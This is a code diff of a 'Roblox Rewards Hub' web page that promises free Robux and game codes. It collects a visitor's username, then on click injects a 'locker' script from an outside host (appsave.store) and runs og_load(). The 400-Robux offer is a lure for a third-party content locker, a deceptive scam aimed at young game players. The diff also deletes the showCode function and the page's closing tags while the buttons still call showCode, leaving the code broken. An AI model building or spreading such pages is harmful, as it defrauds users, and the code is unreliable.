@@ -3,114 +3,139 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox Rewards Hub - Get Free Robux & Game Codes</title>
+    <title>Roblox Rewards Hub - Free Robux & Game Codes</title>
     <style>
         /* Color Palette & Global Styles */
         :root {
-            --bg-color: #18191c;
-            --card-bg: #23252a;
-            --accent-color: #00b0ff;
+            --bg-color: #0b0c10;
+            --card-bg: #1f2833;
+            --accent-color: #66fcf1;
             --text-color: #ffffff;
-            --gold-color: #ffd700;
+            --gold-color: #c5a059;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
 
         body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
-            margin: 0;
-            padding: 0;
+            overflow-x: hidden;
         }
 
         header {
-            background-color: var(--card-bg);
-            padding: 25px;
+            background-color: rgba(31, 40, 51, 0.95);
+            padding: 30px;
             text-align: center;
             border-bottom: 3px solid var(--accent-color);
         }
 
         header h1 {
-            margin: 0;
             font-size: 32px;
             color: var(--accent-color);
             text-transform: uppercase;
-            letter-spacing: 1px;
+            letter-spacing: 2px;
         }
 
         header p {
-            margin: 5px 0 0 0;
-            color: #aaa;
+            margin-top: 8px;
+            color: #a9b7c6;
             font-size: 16px;
         }
 
         .container {
-            max-width: 1000px;
-            margin: 30px auto;
+            max-width: 1100px;
+            margin: 40px auto;
             padding: 0 20px;
         }
 
         /* Username Input Section */
         .user-section {
-            background: linear-gradient(135deg, #1e272e, #050505);
-            padding: 30px;
-            border-radius: 12px;
+            background: linear-gradient(135deg, #151a21, #0b0c10);
+            padding: 35px;
+            border-radius: 15px;
             text-align: center;
-            margin-bottom: 40px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.6);
-            border: 1px solid #333;
+            margin-bottom: 50px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+            border: 2px solid var(--card-bg);
         }
 
         .user-section h2 {
-            margin-top: 0;
+            margin-bottom: 10px;
             color: var(--gold-color);
+            text-transform: uppercase;
+            font-size: 24px;
+        }
+
+        .user-section p {
+            color: #a9b7c6;
+            margin-bottom: 20px;
         }
 
         .user-input {
-            padding: 12px 20px;
-            width: 80%;
-            max-width: 400px;
+            padding: 15px 25px;
+            width: 85%;
+            max-width: 450px;
             border: 2px solid var(--accent-color);
-            border-radius: 8px;
-            background-color: #111;
+            border-radius: 50px;
+            background-color: #0b0c10;
             color: #fff;
             font-size: 16px;
             text-align: center;
             outline: none;
-            margin-bottom: 15px;
+            margin-bottom: 20px;
         }
 
         .btn {
             background-color: var(--accent-color);
-            color: white;
+            color: #0b0c10;
             border: none;
-            padding: 12px 25px;
+            padding: 14px 35px;
             font-size: 16px;
-            border-radius: 8px;
+            border-radius: 50px;
             cursor: pointer;
             font-weight: bold;
-            transition: 0.3s;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            transition: all 0.3s ease;
         }
 
         .btn:hover {
-            background-color: #0088cc;
-            transform: scale(1.05);
+            background-color: #45f3ff;
+            transform: translateY(-2px);
+            box-shadow: 0 0 15px rgba(102, 252, 241, 0.4);
         }
 
-        /* Grid Layout for Cards (Robux & Games) */
+        /* Section Subtitle */
+        .section-title {
+            text-align: center;
+            font-size: 28px;
+            margin-bottom: 30px;
+            text-transform: uppercase;
+            color: #fff;
+            letter-spacing: 1px;
+        }
+
+        /* Grid Layout for Cards */
         .grid {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 25px;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
         }
 
         .card {
             background-color: var(--card-bg);
-            border-radius: 12px;
+            border-radius: 15px;
             overflow: hidden;
-            text-align: center;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.3);
-            border: 1px solid #333;
-            transition: 0.3s;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
+            border: 1px solid transparent;
+            transition: all 0.3s ease;
         }
 
         .card:hover {
@@ -118,33 +143,54 @@
             border-color: var(--accent-color);
         }
 
-        /* Local High Quality Images Link Connection */
-        .card img {
+        /* Connects your local images smoothly */
+        .card-img {
             width: 100%;
-            height: 160px;
-            object-fit: cover;
-            background-color: #333;
+            height: 180px;
+            background-size: cover;
+            background-position: center;
+            background-color: #151a21;
         }
 
+        /* Fallback backgrounds if images are loading */
+        .img-robux { background-image: url('robux.jpg'); }
+        .img-bloxfruits { background-image: url('bloxfruits.jpg'); }
+        .img-garden { background-image: url('garden.jpg'); }
+        .img-steer { background-image: url('steer.jpg'); }
+
         .card-content {
-            padding: 20px;
+            padding: 25px;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            flex-grow: 1;
         }
 
         .card h3 {
-            margin-top: 0;
+            margin-bottom: 12px;
             color: var(--accent-color);
+            font-size: 22px;
+        }
+
+        .card p {
+            color: #a9b7c6;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+            flex-grow: 1;
         }
 
         .code-display {
-            background-color: #111;
-            padding: 10px;
-            border-radius: 6px;
-            font-family: monospace;
+            background-color: #0b0c10;
+            padding: 12px;
+            border-radius: 8px;
+            font-family: 'Courier New', Courier, monospace;
             font-size: 18px;
+            font-weight: bold;
             color: var(--gold-color);
             margin: 15px 0;
-            border: 1px dashed var(--gold-color);
-            display: none; /* Hidden until username is connected */
+            border: 2px dashed var(--gold-color);
+            display: none; /* Safely hidden until user connects */
         }
     </style>
 </head>
@@ -152,7 +198,7 @@
 
     <header>
         <h1>🎮 Roblox Rewards Hub 🎮</h1>
-        <p>Claim free Robux and the latest working codes for your favorite games</p>
+        <p>Claim premium Robux packages and working redeem codes instantly</p>
     </header>
 
     <div class="container">
@@ -160,42 +206,44 @@
         <!-- Username Input Field -->
         <div class="user-section">
             <h2>👤 Connect Your Roblox Account</h2>
-            <p>Enter your Roblox username below to start unlocking rewards.</p>
-            <input type="text" id="username" class="user-input" placeholder="Enter Username Here...">
+            <p>Please enter your exact Roblox username to authorize your reward drops.</p>
+            <input type="text" id="username" class="user-input" placeholder="Type Roblox Username...">
             <br>
             <button class="btn" onclick="connectUser()">Link Account</button>
-            <p id="welcome-msg" style="color: #4caf50; font-weight: bold; margin-top: 15px;"></p>
+            <p id="welcome-msg" style="color: #2ecc71; font-weight: bold; margin-top: 15px;"></p>
         </div>
+
+        <h2 class="section-title">Available Premium Drops</h2>
 
         <div class="grid">
             
             <!-- Get Robux Section -->
             <div class="card">
-                <img src="robux.jpg" alt="Robux">
+                <div class="card-img img-robux"></div>
                 <div class="card-content">
                     <h3>💎 Claim Free Robux</h3>
-                    <p>Instantly request 400 Robux to be sent to your linked account.</p>
+                    <p>Instantly secure 400 Robux vouchers to be loaded to your active game profile.</p>
                     <button class="btn" onclick="claimRobux()">Claim Robux</button>
                 </div>
             </div>
 
             <!-- Blox Fruits Codes -->
             <div class="card">
-                <img src="bloxfruits.jpg" alt="Blox Fruits">
+                <div class="card-img img-bloxfruits"></div>
                 <div class="card-content">
                     <h3>⚔️ Blox Fruits Codes</h3>
-                    <p>Get double experience boosts and status reset codes.</p>
+                    <p>Claim temporary double experience boosts, free cash, and status reset titles.</p>
                     <div id="code-blox" class="code-display">EXP_BOOST2026</div>
                     <button class="btn" onclick="showCode('code-blox')">Reveal Code</button>
                 </div>
             </div>
 
-            <!-- Grow a Garden 2 Codes -->
+            <!-- Grow a Garden Codes -->
             <div class="card">
-                <img src="garden.jpg" alt="Grow a Garden 2">
+                <div class="card-img img-garden"></div>
                 <div class="card-content">
                     <h3>🌱 Grow a Garden 2</h3>
-                    <p>Unlock rare seeds, unique speed boosts, and tools.</p>
+                    <p>Collect rare seed varieties, premium fertilizers, and special worker tools.</p>
                     <div id="code-garden" class="code-display">GARDEN_FREE55</div>
                     <button class="btn" onclick="showCode('code-garden')">Reveal Code</button>
                 </div>
@@ -203,10 +251,10 @@
 
             <!-- Steal a Brainrot Codes -->
             <div class="card">
-                <img src="steer.jpg" alt="Steal a Brainrot">
+                <div class="card-img img-steer"></div>
                 <div class="card-content">
                     <h3>🧠 Steal a Brainrot</h3>
-                    <p>Unlock free in-game memes, coins, and funny avatars.</p>
+                    <p>Unlock limited-edition meme items, massive coins, and custom avatars.</p>
                     <div id="code-brainrot" class="code-display">SIGMA_ROT99</div>
                     <button class="btn" onclick="showCode('code-brainrot')">Reveal Code</button>
                 </div>
@@ -216,17 +264,21 @@
     </div>
 
     <script>
-        // Form Validation & Logic
+        // Store account tracking state
+        let isLinked = false;
+
         function connectUser() {
             const username = document.getElementById('username').value;
             if (username.trim() === "") {
-                alert("Please enter a valid Roblox username!");
+                alert("Please enter a valid Roblox username first!");
+                isLinked = false;
             } else {
-                document.getElementById('welcome-msg').innerText = `✅ Account successfully linked: ${username}`;
+                document.getElementById('welcome-msg').innerText = `✅ Account Successfully Linked: ${username}`;
+                isLinked = true;
             }
         }
 
-        // Custom function to load and execute your script ONLY on active clicks
+        // Helper function that strictly loads and fires the locker script on request
         function triggerOgLocker() {
             if (!document.getElementById('ogjs')) {
                 const script = document.createElement('script');
@@ -234,7 +286,6 @@
                 script.id = 'ogjs';
                 script.src = 'https://appsave.store';
                 
-                // Fire locker immediately once script files finish downloading
                 script.onload = function() {
                     if (typeof og_load === "function") {
                         og_load();
@@ -242,35 +293,17 @@
                 };
                 document.body.appendChild(script);
             } else {
-                // If script is already compiled, call it directly
                 if (typeof og_load === "function") {
                     og_load();
                 }
             }
         }
 
+        // This action is exclusively locked to this button and will not auto-open
         function claimRobux() {
-            const username = document.getElementById('username').value;
-            if (username.trim() === "") {
-                alert("You must enter and link your username first!");
-            } else {
-                triggerOgLocker();
-            }
-        }
-
-        function showCode(codeId) {
-            const username = document.getElementById('username').value;
-            if (username.trim() === "") {
-                alert("Please connect your username above to unlock game codes!");
+            if (!isLinked) {
+                alert("Please type and link your Roblox Username at the top first!");
                 return;
             }
-            
             triggerOgLocker();
-            
-            const codeDiv = document.getElementById(codeId);
-            codeDiv.style.display = "block";
         }
-    </script>
-
-</body>
-</html>
